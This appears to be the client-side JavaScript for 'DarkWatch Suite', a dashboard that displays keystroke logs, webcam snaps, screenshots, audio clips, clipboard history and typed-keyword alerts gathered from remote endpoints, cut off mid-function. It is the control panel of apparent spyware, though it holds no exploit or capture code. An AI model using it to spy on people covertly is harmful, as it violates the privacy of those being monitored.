/* ===================================================================
   Project: DarkWatch Suite - Web Dashboard Interactivity
   Theme: Dynamic Liquid Glass UI & Multi-Theme Selector
   =================================================================== */

let cachedModules = {
    keystrokes: true,
    webcam: true,
    screenshots: true,
    audio: true,
    clipboard: true
};

// Global switchTab helper for card clicks
window.switchTab = function(tabName) {
    const targetNav = document.querySelector(`.nav-item[data-tab="${tabName}"]`);
    if (targetNav) {
        targetNav.click();
    }
};

document.addEventListener("DOMContentLoaded", () => {
    // Navigation Tabs
    const navItems = document.querySelectorAll(".nav-item");
    const tabContents = document.querySelectorAll(".tab-content");
    const headerTitle = document.getElementById("header-title");

    navItems.forEach(item => {
        item.addEventListener("click", () => {
            const targetTab = item.getAttribute("data-tab");
            
            navItems.forEach(nav => nav.classList.remove("active"));
            tabContents.forEach(tab => tab.classList.remove("active"));

            item.classList.add("active");
            const targetElement = document.getElementById(`tab-${targetTab}`);
            if (targetElement) {
                targetElement.classList.add("active");
            }

            if (headerTitle) {
                headerTitle.textContent = item.innerText.trim();
            }
            loadTabData(targetTab);
        });
    });

    // Theme Selector Setup
    setupThemeSelector();

    // Auto-refresh timer
    setInterval(fetchStats, 3000);
    fetchStats();
    loadOverviewData();

    // Refresh Button
    const btnRefresh = document.getElementById("btn-refresh");
    if (btnRefresh) {
        btnRefresh.addEventListener("click", () => {
            const activeNav = document.querySelector(".nav-item.active");
            const activeTab = activeNav ? activeNav.getAttribute("data-tab") : "overview";
            fetchStats();
            loadTabData(activeTab);
        });
    }

    // Clear All Records Button
    const btnClearAll = document.getElementById("btn-clear-all");
    if (btnClearAll) {
        btnClearAll.addEventListener("click", () => {
            if (confirm("Are you sure you want to delete ALL captured records, logs, screenshots, and audio clips?")) {
                clearCategory("all");
            }
        });
    }

    // Quick Webcam Pause button in Webcam tab
    const btnWebcamToggleQuick = document.getElementById("btn-webcam-toggle-quick");
    if (btnWebcamToggleQuick) {
        btnWebcamToggleQuick.addEventListener("click", () => {
            toggleModuleAction("webcam");
        });
    }

    // Record audio button in Audio tab
    const triggerAudioTab = document.getElementById("trigger-audio-tab");
    if (triggerAudioTab) {
        triggerAudioTab.addEventListener("click", () => {
            triggerAudioTab.disabled = true;
            const orig = triggerAudioTab.innerHTML;
            triggerAudioTab.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Recording 10s...`;
            fetch("/api/trigger/audio", { method: "POST" })
                .then(res => res.json())
                .then(data => {
                    triggerAudioTab.disabled = false;
                    triggerAudioTab.innerHTML = `<i class="fa-solid fa-check"></i> Clip Saved!`;
                    loadAudioData();
                    fetchStats();
                    setTimeout(() => { triggerAudioTab.innerHTML = orig; }, 3000);
                })
                .catch(err => {
                    triggerAudioTab.disabled = false;
                    triggerAudioTab.innerHTML = orig;
                    alert("Audio recording failed or module disabled.");
                });
        });
    }

    // Setup toggles and modules
    setupModuleToggles();
    setupSettingsForm();
    setupTriggers();
    setupModal();
    setupSearch();
    setupAlertsDrawer();
    setupEndpointsTab();
});

// Setup Light / Dark Theme Toggle (Mini Icon Button next to DarkWatch brand)
function setupThemeSelector() {
    const btn = document.getElementById("btn-theme-toggle");
    const icon = document.getElementById("theme-toggle-icon");

    // Load saved theme or default to liquid-light
    let currentTheme = localStorage.getItem("darkwatch_theme") || "liquid-light";
    if (currentTheme !== "liquid-dark" && currentTheme !== "liquid-light") {
        currentTheme = "liquid-light";
    }

    applyTheme(currentTheme);

    if (btn) {
        btn.addEventListener("click", () => {
            const newTheme = (currentTheme === "liquid-light") ? "liquid-dark" : "liquid-light";
            applyTheme(newTheme);
        });
    }

    function applyTheme(themeName) {
        currentTheme = themeName;
        document.documentElement.setAttribute("data-theme", themeName);
        localStorage.setItem("darkwatch_theme", themeName);

        if (icon) {
            if (themeName === "liquid-dark") {
                icon.className = "fa-solid fa-sun";
                if (btn) btn.setAttribute("title", "Switch to Light Mode");
            } else {
                icon.className = "fa-solid fa-moon";
                if (btn) btn.setAttribute("title", "Switch to Dark Mode");
            }
        }
    }
}

// Fetch Engine Stats & Metrics
function fetchStats() {
    fetch("/api/stats")
        .then(res => {
            if (res.status === 401) {
                window.location.href = "/login";
                return null;
            }
            return res.json();
        })
        .then(data => {
            if (!data) return;

            document.getElementById("stat-keystrokes").innerText = data.total_keystrokes || 0;
            document.getElementById("stat-screenshots").innerText = data.screenshots_count || 0;
            document.getElementById("stat-webcam").innerText = data.webcam_count || 0;
            document.getElementById("stat-audio").innerText = data.audio_count || 0;

            const activeWin = document.getElementById("active-window-text");
            if (activeWin) {
                activeWin.innerText = data.active_window || "System";
            }

            const statusText = document.getElementById("engine-status-text");
            const statusDot = document.getElementById("engine-status-dot");
            if (statusText) statusText.innerText = data.status;
            if (statusDot) {
                if (data.status === "Active") {
                    statusDot.style.background = "#059669";
                    statusDot.style.boxShadow = "0 0 10px #10b981";
                } else {
                    statusDot.style.background = "#ef4444";
                    statusDot.style.boxShadow = "0 0 10px #ef4444";
                }
            }

            if (data.modules) {
                cachedModules = data.modules;
                updateModuleUI(data.modules);
            }

            // Update Notification Bell Badge & Animation
            const notifBadge = document.getElementById("notif-badge");
            const notifBtn = document.getElementById("btn-open-notifications");
            if (notifBadge && notifBtn) {
                const unreadCount = (data.dlp && data.dlp.unread_count) ? data.dlp.unread_count : 0;
                if (unreadCount > 0) {
                    notifBadge.textContent = unreadCount > 99 ? "99+" : unreadCount;
                    notifBadge.style.display = "flex";
                    notifBtn.classList.add("has-unread");
                } else {
                    notifBadge.style.display = "none";
                    notifBtn.classList.remove("has-unread");
                }
            }

            // If alerts drawer is currently open, refresh its contents
            const alertsDrawer = document.getElementById("alerts-drawer");
            if (alertsDrawer && alertsDrawer.classList.contains("active")) {
                loadAlertsDrawer();
            }

            // If productivity tab is active, refresh chart & timeline
            const activeTab = document.querySelector(".nav-item.active");
            if (activeTab && activeTab.getAttribute("data-tab") === "productivity") {
                loadProductivityData();
            } else if (activeTab && activeTab.getAttribute("data-tab") === "endpoints") {
                loadEndpointsData();
            }
        })
        .catch(err => console.error("Stats fetch error:", err));
}

// Setup Top-Right Notification Bell & Slide-Over Alerts Drawer
function setupAlertsDrawer() {
    const btnOpen = document.getElementById("btn-open-notifications");
    const btnClose = document.getElementById("btn-close-drawer");
    const overlay = document.getElementById("drawer-overlay");
    const drawer = document.getElementById("alerts-drawer");
    const btnMarkRead = document.getElementById("btn-mark-read");
    const btnClearAlerts = document.getElementById("btn-clear-alerts");

    if (btnOpen) {
        btnOpen.addEventListener("click", () => {
            openAlertsDrawer();
        });
    }

    if (btnClose) {
        btnClose.addEventListener("click", () => {
            closeAlertsDrawer();
        });
    }

    if (overlay) {
        overlay.addEventListener("click", () => {
            closeAlertsDrawer();
        });
    }

    if (btnMarkRead) {
        btnMarkRead.addEventListener("click", () => {
            fetch("/api/dlp/mark_read", { method: "POST" })
                .then(() => {
                    fetchStats();
                    loadAlertsDrawer();
                })
                .catch(err => console.error("Error marking read:", err));
        });
    }

    if (btnClearAlerts) {
        btnClearAlerts.addEventListener("click", () => {
            if (confirm("Are you sure you want to clear all security alerts?")) {
                fetch("/api/dlp/clear", { method: "POST" })
                    .then(() => {
                        fetchStats();
                        loadAlertsDrawer();
                    })
                    .catch(err => console.error("Error clearing alerts:", err));
            }
        });
    }

    function openAlertsDrawer() {
        if (drawer && overlay) {
            drawer.classList.add("active");
            overlay.classList.add("active");
            loadAlertsDrawer();
            // Automatically mark read after user opens the drawer
            setTimeout(() => {
                fetch("/api/dlp/mark_read", { method: "POST" })
                    .then(() => fetchStats())
                    .catch(() => {});
            }, 1200);
        }
    }

    function closeAlertsDrawer() {
        if (drawer && overlay) {
            drawer.classList.remove("active");
            overlay.classList.remove("active");
        }
    }
}

// Load Alerts into the Slide-Over Drawer
function loadAlertsDrawer() {
    const listContainer = document.getElementById("drawer-alerts-list");
    const summaryText = document.getElementById("drawer-status-summary");
    if (!listContainer) return;

    fetch("/api/dlp/status")
        .then(res => res.json())
        .then(data => {
            const alerts = data.alerts || [];
            const unread = data.unread_count || 0;
            const total = data.total_alerts || 0;

            if (summaryText) {
                summaryText.textContent = `${total} Total Alert${total === 1 ? '' : 's'}${unread > 0 ? ` (${unread} new)` : ''}`;
            }

            if (alerts.length === 0) {
                listContainer.innerHTML = `
                    <div class="empty-alerts">
                        <i class="fa-regular fa-bell-slash"></i>
                        <h4>No Alerts Detected</h4>
                        <p>Sensitive keywords typed or copied on this system will appear here with full context details.</p>
                    </div>
                `;
                return;
            }

            let html = "";
            alerts.forEach(al => {
                const unreadClass = al.read ? "" : "unread";
                const tagsHtml = (al.matched_keywords || [])
                    .map(kw => `<span class="alert-keyword-pill"><i class="fa-solid fa-triangle-exclamation"></i> ${escapeHtml(kw)}</span>`)
                    .join(" ");

                html += `
                    <div class="alert-card ${unreadClass}">
                        <div class="alert-card-header">
                            <div class="alert-tags">${tagsHtml}</div>
                            <span class="alert-time"><i class="fa-regular fa-clock"></i> ${escapeHtml(al.timestamp || '')}</span>
                        </div>
                        <div class="alert-source">
                            <i class="fa-solid fa-window-maximize"></i> Source: <strong>${escapeHtml(al.source || 'Active App')}</strong>
                        </div>
                        <div class="alert-snippet-box">
                            <span class="snippet-label">Full Context / Typed Text:</span>
                            <pre class="snippet-content">${escapeHtml(al.snippet || '(No snippet available)')}</pre>
                        </div>
                    </div>
                `;
            });

            listContainer.innerHTML = html;
        })
        .catch(err => {
            console.error("Error loading alerts drawer:", err);
        });
}

// Module UI Updater
function updateModuleUI(modules) {
    for (const [mod, state] of Object.entries(modules)) {
        // Toggle checkboxes
        const chk = document.getElementById(`toggle-${mod}`);
        if (chk && chk !== document.activeElement) {
            chk.checked = Boolean(state);
        }

        // Badges in Controls Tab
        const badge = document.getElementById(`badge-${mod}`);
        if (badge) {
            badge.textContent = state ? "Active" : "Paused";
            badge.className = `badge-status ${state ? "active" : "paused"}`;
        }
    }

    // Quick button in Webcam tab
    const btnWebcamQuick = document.getElementById("btn-webcam-toggle-quick");
    if (btnWebcamQuick) {
        if (modules.webcam) {
            btnWebcamQuick.innerHTML = `<i class="fa-solid fa-pause"></i> Pause Webcam`;
            btnWebcamQuick.className = "btn btn-action";
        } else {
            btnWebcamQuick.innerHTML = `<i class="fa-solid fa-play"></i> Resume Webcam`;
            btnWebcamQuick.className = "btn btn-action btn-danger";
        }
    }
}

// Setup Switch Toggles
function setupModuleToggles() {
    const moduleNames = ["webcam", "screenshots", "keystrokes", "audio", "clipboard"];
    
    moduleNames.forEach(mod => {
        // Checkbox switch
        const chk = document.getElementById(`toggle-${mod}`);
        if (chk) {
            chk.addEventListener("change", (e) => {
                const newState = e.target.checked;
                sendModuleToggle(mod, newState);
            });
        }
    });
}

function toggleModuleAction(mod) {
    const currentState = Boolean(cachedModules[mod]);
    const newState = !currentState;
    sendModuleToggle(mod, newState);
}

function sendModuleToggle(mod, targetState) {
    fetch("/api/modules/toggle", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ module: mod, state: targetState })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success && data.modules) {
            cachedModules = data.modules;
            updateModuleUI(data.modules);
            fetchStats();
        }
    })
    .catch(err => {
        console.error("Module toggle failed:", err);
        alert(`Failed to toggle ${mod}`);
    });
}

// Clear Records Function
window.clearCategory = function(category) {
    let confirmMsg = `Delete all records for '${category}'?`;
    if (category === "all") {
        confirmMsg = "Are you sure you want to wipe ALL captured records, logs, screenshots, and audio recordings?";
    }
    
    if (!confirm(confirmMsg)) return;

    fetch("/api/records/clear", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: category })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            fetchStats();
            const activeNav = document.querySelector(".nav-item.active");
            const activeTab = activeNav ? activeNav.getAttribute("data-tab") : "overview";
            loadTabData(activeTab);
            alert(`Records for '${category}' cleared successfully.`);
        } else {
            alert("Could not clear records.");
        }
    })
    .catch(err => {
        console.error("Clear error:", err);
        alert("Error clearing records.");
    });
};

// Settings Form Management
function setupSettingsForm() {
    const form = document.getElementById("settings-form");
    if (!form) return;

    form.addEventListener("submit", (e) => {
        e.preventDefault();
        const msg = document.getElementById("settings-msg");
        const btn = document.getElementById("btn-save-settings");

        const username = document.getElementById("cfg-username").value.trim();
        const password = document.getElementById("cfg-password").value.trim();
        const projectName = document.getElementById("cfg-project-name").value.trim();
        const interval = document.getElementById("cfg-interval").value;

        btn.disabled = true;
        btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Saving...`;

        const payload = {
            username: username,
            project_name: projectName,
            capture_interval_seconds: interval
        };
        if (password) {
            payload.password = password;
        }

        fetch("/api/settings", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => {
            btn.disabled = false;
            btn.innerHTML = `<i class="fa-solid fa-floppy-disk"></i> Save Configuration`;

            if (data.success) {
                msg.style.color = "#059669";
                msg.textContent = "Configuration updated successfully!";
                setTimeout(() => { msg.textContent = ""; }, 3000);
            } else {
                msg.style.color = "#e11d48";
                msg.textContent = "Failed to update configuration.";
            }
        })
        .catch(err => {
            btn.disabled = false;
            btn.innerHTML = `<i class="fa-solid fa-floppy-disk"></i> Save Configuration`;
            msg.style.color = "#e11d48";
            msg.textContent = "Error saving settings.";
        });
    });
}

function loadSettingsData() {
    fetch("/api/settings")
        .then(res => res.json())
        .then(data => {
            const userField = document.getElementById("cfg-username");
            const nameField = document.getElementById("cfg-project-name");
            const intField = document.getElementById("cfg-interval");

            if (userField) userField.value = data.username || "admin";
            if (nameField) nameField.value = data.project_name || "DarkWatch Intelligence Suite";
            if (intField) intField.value = data.capture_interval_seconds || 30;
        })
        .catch(err => console.error("Error loading settings:", err));
}

// Load Tab Specific Data
let appTimeChartInstance = null;

function loadTabData(tab) {
    if (tab === "overview") loadOverviewData();
    else if (tab === "keystrokes") loadKeystrokesData();
    else if (tab === "screenshots") loadGalleryData("screenshots", "screenshots-gallery");
    else if (tab === "webcam") loadGalleryData("webcam", "webcam-gallery");
    else if (tab === "audio") loadAudioData();
    else if (tab === "clipboard") loadClipboardData();
    else if (tab === "system") loadSystemInfoData();
    else if (tab === "productivity") loadProductivityData();
    else if (tab === "endpoints") loadEndpointsData();
    else if (tab === "settings") loadSettingsData();
}

function loadProductivityData() {
    fetch("/api/activity/usage")
        .then(res => res.json())
        .then(data => {
            const current = data.current || {};
            const usage = data.usage || {};
            const timeline = data.timeline || [];
            const chartPayload = data.chartjs || { labels: [], datasets: [] };

            // 1. Update metric cards
            const appEl = document.getElementById("active-app-name");
            const tabEl = document.getElementById("active-tab-title");
            const countEl = document.getElementById("tracked-apps-count");

            if (appEl) appEl.textContent = current.app || "idle.exe";
            if (tabEl) tabEl.textContent = current.tab || current.title || "Desktop / System";
            if (countEl) countEl.textContent = Object.keys(usage).length;

            // 2. Render / Update Chart.js
            const ctx = document.getElementById("app-time-chart");
            if (ctx && typeof Chart !== "undefined") {
                if (appTimeChartInstance) {
                    appTimeChartInstance.data.labels = chartPayload.labels || [];
                    if (chartPayload.datasets && chartPayload.datasets.length > 0) {
                        appTimeChartInstance.data.datasets[0].data = chartPayload.datasets[0].data || [];
                    }
                    appTimeChartInstance.update();
                } else {
                    appTimeChartInstance = new Chart(ctx, {
                        type: "doughnut",
                        data: chartPayload,
                        options: {
                            responsive: true,
                            maintainAspectRatio: false,
                            plugins: {
                                legend: {
                                    position: "bottom",
                                    labels: {
                                        color: "#94a3b8",
                                        font: { family: "JetBrains Mono", size: 11 }
                                    }
                                }
                            },
                            cutout: "68%"
                        }
                    });
                }
            }

            // 3. Render Activity Timeline
            const timelineList = document.getElementById("activity-timeline-list");
            if (timelineList) {
                if (timeline.length === 0) {
                    timelineList.innerHTML = `<p class="text-hint" style="text-align: center; padding: 25px 0;">No window switches logged yet.</p>`;
                    return;
                }

                timelineList.innerHTML = timeline.map(item => `
                    <div style="padding: 10px 12px; margin-bottom: 8px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; display: flex; align-items: center; justify-content: space-between;">
                        <div style="min-width: 0; flex: 1; margin-right: 12px;">
                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
                                <span style="background: rgba(14, 165, 233, 0.2); color: #38bdf8; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; font-weight: 600;">
                                    ${escapeHtml(item.app)}
                                </span>
                                <span style="color: #64748b; font-size: 0.75rem; font-family: 'JetBrains Mono', monospace;">${item.timestamp}</span>
                            </div>
                            <div style="color: #cbd5e1; font-size: 0.85rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="${escapeHtml(item.tab || item.title)}">
                                ${escapeHtml(item.tab || item.title)}
                            </div>
                        </div>
                        <div style="text-align: right; white-space: nowrap;">
                            <span style="color: #94a3b8; font-size: 0.75rem; font-family: 'JetBrains Mono', monospace;">
                                ${item.duration_seconds < 60 ? `${item.duration_seconds}s` : `${Math.round(item.duration_seconds / 60)}m`}
                            </span>
                        </div>
                    </div>
                `).join("");
            }
        })
        .catch(err => console.error("Error loading productivity data:", err));
}

function loadOverviewData() {
    fetch("/api/logs/keystrokes")
        .then(res => res.json())
        .then(data => {
            const lines = (data.content || "").split("\n");
            const recent = lines.slice(-25).join("\n");
            const elem = document.getElementById("recent-keys-preview");
            if (elem) elem.textContent = recent || "No logs recorded.";
        })
        .catch(() => {});

    fetch("/api/logs/clipboard")
        .then(res => res.json())
        .then(data => {
            const elem = document.getElementById("recent-clipboard-preview");
            if (elem) elem.textContent = data.content || "No clipboard logs.";
        })
        .catch(() => {});
}

function loadKeystrokesData() {
    fetch("/api/logs/keystrokes")
        .then(res => res.json())
        .then(data => {
            const elem = document.getElementById("full-keystrokes-log");
            if (elem) {
                elem.textContent = data.content || "No keystrokes recorded.";
                elem.scrollTop = elem.scrollHeight;
            }
        });
}

function loadClipboardData() {
    fetch("/api/logs/clipboard")
        .then(res => res.json())
        .then(data => {
            const elem = document.getElementById("full-clipboard-log");
            if (elem) {
                elem.textContent = data.content || "No clipboard logs.";
                elem.scrollTop = elem.scrollHeight;
            }
        });
}

function loadSystemInfoData() {
    fetch("/api/logs/system")
        .then(res => res.json())
        .then(data => {
            const elem = document.getElementById("full-system-info");
            if (elem) elem.textContent = data.content || "System info loading...";
        });
}

function loadAudioData() {
    fetch("/api/gallery/audio")
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById("audio-recordings-list");
            if (!container) return;
            container.innerHTML = "";

            if (!data.files || data.files.length === 0) {
                container.innerHTML = `<p class="empty-msg">No audio recordings captured yet.</p>`;
                return;
            }

            data.files.forEach(file => {
                const card = document.createElement("div");
                card.className = "audio-record-card";
                card.innerHTML = `
                    <div class="audio-meta">
                        <div class="audio-icon"><i class="fa-solid fa-file-audio"></i></div>
                        <div>
                            <h4>${file.filename}</h4>
                            <span class="audio-size">${file.size_kb} KB &bull; WAV Audio Clip</span>
                        </div>
                    </div>
                    <div class="audio-player-wrapper">
                        <audio controls preload="none">
                            <source src="${file.url}" type="audio/wav">
                            Your browser does not support audio playback.
                        </audio>
                        <a href="${file.url}" download="${file.filename}" class="btn-download-audio" title="Download WAV">
                            <i class="fa-solid fa-download"></i>
                        </a>
                    </div>
                `;
                container.appendChild(card);
            });
        })
        .catch(err => console.error("Error loading audio files:", err));
}

function loadGalleryData(category, containerId) {
    fetch(`/api/gallery/${category}`)
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById(containerId);
            if (!container) return;
            container.innerHTML = "";

            if (!data.files || data.files.length === 0) {
                container.innerHTML = `<p class="empty-msg">No ${category} captured yet.</p>`;
                return;
            }

            data.files.forEach(file => {
                const card = document.createElement("div");
                card.className = "gallery-card";
                card.innerHTML = `
                    <img src="${file.url}" alt="${file.filename}" loading="lazy">
                    <div class="gallery-info">
                        <span>${file.filename}</span>
                        <span>${file.size_kb} KB</span>
                    </div>
                `;
                card.addEventListener("click", () => openModal(file.url, file.filename));
                container.appendChild(card);
            });
        });
}

function setupTriggers() {
    const triggers = [
        { id: "trigger-screenshot", action: "screenshot", label: "Screenshot captured!" },
        { id: "trigger-webcam", action: "webcam", label: "WebCam snap taken!" },
        { id: "trigger-audio", action: "audio", label: "Audio clip recorded!" },
        { id: "trigger-encrypt", action: "encrypt", label: "Logs encrypted successfully!" }
    ];

    triggers.forEach(t => {
        const btn = document.getElementById(t.id);
        if (btn) {
            btn.addEventListener("click", () => {
                btn.disabled = true;
                const origHtml = btn.innerHTML;
                btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Processing...`;

                fetch(`/api/trigger/${t.action}`, { method: "POST" })
                    .then(res => res.json())
                    .then(data => {
                        btn.disabled = false;
                        btn.innerHTML = `<i class="fa-solid fa-check"></i> ${t.label}`;
                        fetchStats();
                        if (t.action === "audio") {
                            loadAudioData();
                        }
                        setTimeout(() => {
                            btn.innerHTML = origHtml;
                        }, 2500);
                    })
                    .catch(err => {
                        btn.disabled = false;
                        btn.innerHTML = origHtml;
                        alert("Trigger failed or module is currently disabled.");
                    });
            });
        }
    });
}

function setupModal() {
    const modal = document.getElementById("image-modal");
    const closeBtn = document.getElementById("modal-close");
    const overlay = document.querySelector(".modal-overlay");

    if (closeBtn) closeBtn.addEventListener("click", closeModal);
    if (overlay) overlay.addEventListener("click", closeModal);
}

function openModal(url, caption) {
    const modal = document.getElementById("image-modal");
    const modalImg = document.getElementById("modal-img");
    const modalCap = document.getElementById("modal-caption");

    if (modalImg) modalImg.src = url;
    if (modalCap) modalCap.textContent = caption;
    if (modal) modal.classList.add("active");
}

function closeModal() {
    const modal = document.getElementById("image-modal");
    if (modal) modal.classList.remove("active");
}

function setupSearch() {
    const searchInput = document.getElementById("search-keystrokes");
    if (!searchInput) return;

    searchInput.addEventListener("input", (e) => {
        const query = e.target.value.toLowerCase();
        const logElem = document.getElementById("full-keystrokes-log");
        if (!logElem) return;

        const fullText = logElem.textContent;

        if (!query) {
            loadKeystrokesData();
            return;
        }

        const lines = fullText.split("\n");
        const filtered = lines.filter(line => line.toLowerCase().includes(query));
        logElem.textContent = filtered.join("\n");
    });
}

function escapeHtml(text) {
    if (!text) return "";
    return text.toString()
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// ===================================================================
// Remote Endpoints Telemetry & AI Systems Administrator Logic
// ===================================================================
let selectedEndpointId = null;
let cachedEndpointsList = [];

function setupEndpointsTab() {
    const btnShowModal = document.getElementById("btn-show-agent-modal");
    const btnCloseModal = document.getElementById("btn-close-agent-modal");
    const overlay = document.getElementById("agent-modal-overlay");
    const agentModal = document.getElementById("agent-modal");
    const btnRefresh = document.getElementById("btn-refresh-endpoints");

    if (btnShowModal && agentModal) {
        btnShowModal.addEventListener("click", () => {
            agentModal.classList.add("active");
        });
    }

    if (btnCloseModal && agentModal) {
        btnCloseModal.addEventListener("click", () => {
            agentModal.classList.remove("active");
        });
    }

    if (overlay && agentModal) {
        overlay.addEventListener("click", () => {
            agentModal.classList.remove("active");
        });
    }

    if (btnRefresh) {
        btnRefresh.addEventListener("click", () => {
            loadEndpointsData();
        });
    }

    setupEndpointSubTabs();
}

function loadEndpointsData() {
    fetch("/api/telemetry/endpoints")
        .then(res => {
            if (res.status === 401) {
                window.location.href = "/login";
                return null;
            }
            return res.json();
        })
        .then(data => {
            if (!data) return;
            cachedEndpointsList = data.endpoints || [];

            // Update Summary Counters
            const totalEl = document.getElementById("ep-stat-total");
            const onlineEl = document.getElementById("ep-stat-online");
            const warningsEl = document.getElementById("ep-stat-warnings");
            const healthEl = document.getElementById("ep-stat-health");
            const badgeCount = document.getElementById("ep-device-count-badge");

            if (totalEl) totalEl.textContent = data.total_count || 0;
            if (onlineEl) onlineEl.textContent = data.online_count || 0;
            if (warningsEl) warningsEl.textContent = data.warning_count || 0;
            if (badgeCount) badgeCount.textContent = `${data.total_count || 0} Nodes`;

            if (healthEl) {
                if (data.warning_count > 0) {
                    healthEl.textContent = "Attention Required";
                    healthEl.style.color = "#e11d48";
                } else if (data.online_count > 0) {
                    healthEl.textContent = "Nominal";
                    healthEl.style.color = "#059669";
                } else {
                    healthEl.textContent = "Standby";
                    healthEl.style.color = "var(--text-muted)";
                }
            }

            renderEndpointDeviceList(cachedEndpointsList);

            if (cachedEndpointsList.length === 0) {
                renderEmptyEndpointDetails();
                return;
            }

            // Find current selected device or default to first
            let currentDev = cachedEndpointsList.find(d => {
                const id = (d.device_identification && d.device_identification.device_id) || d.hostname;
                return id === selectedEndpointId;
            });

            if (!currentDev && cachedEndpointsList.length > 0) {
                currentDev = cachedEndpointsList[0];
                const firstId = (currentDev.device_identification && currentDev.device_identification.device_id) || currentDev.hostname;
                selectedEndpointId = firstId;
            }

            if (currentDev) {
                renderEndpointDetails(currentDev);
            }
        })
        .catch(err => console.error("Endpoints fetch error:", err));
}

function renderEndpointDeviceList(endpoints) {
    const container = document.getElementById("ep-device-list");
    if (!container) return;

    if (!endpoints || endpoints.length === 0) {
        container.innerHTML = `
            <div class="endpoint-empty-list">
                <i class="fa-solid fa-circle-nodes"></i>
                <p>No endpoints reporting.<br>Deploy an agent to start live telemetry stream.</p>
            </div>
        `;
        return;
    }

    let html = "";
    endpoints.forEach(dev => {
        const devId = (dev.device_identification && dev.device_identification.device_id) || "unknown";
        const hostname = (dev.device_identification && dev.device_identification.hostname) || "Host";
        const ip = (dev.device_identification && dev.device_identification.local_ip) || "0.0.0.0";
        const isOnline = Boolean(dev.is_online);
        const analysis = dev.analysis || { status: "HEALTHY" };
        const status = analysis.status || "HEALTHY";
        const isSelected = (devId === selectedEndpointId);

        let osIcon = "fa-brands fa-windows";
        const osName = (dev.device_identification && dev.device_identification.os_name || "").toLowerCase();
        if (osName.includes("linux")) osIcon = "fa-brands fa-linux";
        else if (osName.includes("darwin") || osName.includes("mac")) osIcon = "fa-brands fa-apple";

        html += `
            <div class="endpoint-device-card ${isSelected ? 'active' : ''}" onclick="selectEndpoint('${escapeHtml(devId)}')">
                <div class="ep-card-top">
                    <span class="ep-card-host">
                        <i class="${osIcon}"></i> ${escapeHtml(hostname)}
                    </span>
                    <span class="ep-status-dot ${isOnline ? 'online' : 'offline'}" title="${isOnline ? 'Online (Active)' : 'Offline / Stale'}"></span>
                </div>
                <div class="ep-card-ip">${escapeHtml(ip)}</div>
                <div class="ep-card-meta">
                    <span class="ep-badge-health ${status.toLowerCase()}">${escapeHtml(status)}</span>
                    <span class="text-muted">${escapeHtml(dev.last_seen_str || dev.timestamp || '')}</span>
                </div>
            </div>
        `;
    });

    container.innerHTML = html;
}

window.selectEndpoint = function(devId) {
    selectedEndpointId = devId;
    renderEndpointDeviceList(cachedEndpointsList);
    const target = cachedEndpointsList.find(d => {
        const id = (d.device_identification && d.device_identification.device_id) || d.hostname;
        return id === devId;
    });
    if (target) {
        renderEndpointDetails(target);
    }
};

function renderEmptyEndpointDetails() {
    const banner = document.getElementById("ep-ai-evaluation-banner");
    if (banner) {
        banner.className = "ep-ai-banner healthy";
        const statusText = document.getElementById("ep-eval-status");
        if (statusText) statusText.textContent = "NO NODE SELECTED";
        const evalTime = document.getElementById("ep-eval-time");
        if (evalTime) evalTime.textContent = "Awaiting telemetry...";
        const evalSummary = document.getElementById("ep-eval-summary");
        if (evalSummary) evalSummary.textContent = "No endpoints currently reporting telemetry. Click 'Deploy Agent Guide' above to install on any device.";
        const warnContainer = document.getElementById("ep-warnings-list");
        if (warnContainer) warnContainer.style.display = "none";
    }
}

function renderEndpointDetails(dev) {
    const devIdInfo = dev.device_identification || {};
    const perf = dev.system_performance || {};
    const health = dev.operational_health || {};
    const sec = dev.security_state || {};
    const analysis = dev.analysis || { status: "HEALTHY", warnings: [], summary: "Nominal" };

    // Banner & AI evaluation
    const banner = document.getElementById("ep-ai-evaluation-banner");
    const statusText = document.getElementById("ep-eval-status");
    const statusIcon = document.getElementById("ep-eval-status-icon");
    const evalTime = document.getElementById("ep-eval-time");
    const evalSummary = document.getElementById("ep-eval-summary");
    const warnContainer = document.getElementById("ep-warnings-list");

    const st = (analysis.status || "HEALTHY").toUpperCase();
    if (banner) banner.className = `ep-ai-banner ${st.toLowerCase()}`;
    if (statusText) statusText.textContent = st;
    if (statusIcon) {
        if (st === "CRITICAL") statusIcon.className = "fa-solid fa-triangle-exclamation";
        else if (st === "WARNING") statusIcon.className = "fa-solid fa-circle-exclamation";
        else statusIcon.className = "fa-solid fa-shield-heart";
    }
    if (evalTime) evalTime.textContent = `Evaluated: ${analysis.evaluated_at || dev.last_seen_str || 'Just now'}`;
    if (evalSummary) evalSummary.textContent = analysis.summary || "System metrics nominal.";

    // Warnings list
    if (warnContainer) {
        const warnings = analysis.warnings || [];
        if (warnings.length > 0) {
            warnContainer.style.display = "flex";
            let wHtml = "";
            warnings.forEach(w => {
                const sev = w.severity || "WARNING";
                wHtml += `
                    <div class="ep-warning-card severity-${escapeHtml(sev)}">
                        <i class="fa-solid fa-triangle-exclamation"></i>
                        <div>
                            <span class="ep-warning-card-title">${escapeHtml(w.title)}</span>
                            <span>${escapeHtml(w.message)}</span>
                        </div>
                    </div>
                `;
            });
            warnContainer.innerHTML = wHtml;
        } else {
            warnContainer.style.display = "none";
            warnContainer.innerHTML = "";
        }
    }

    // 1. Device Identification
    const hostEl = document.getElementById("ep-val-hostname");
    const osEl = document.getElementById("ep-val-os");
    const ipEl = document.getElementById("ep-val-ip");
    const archEl = document.getElementById("ep-val-arch");
    const uuidEl = document.getElementById("ep-val-uuid");

    if (hostEl) hostEl.textContent = devIdInfo.hostname || "--";
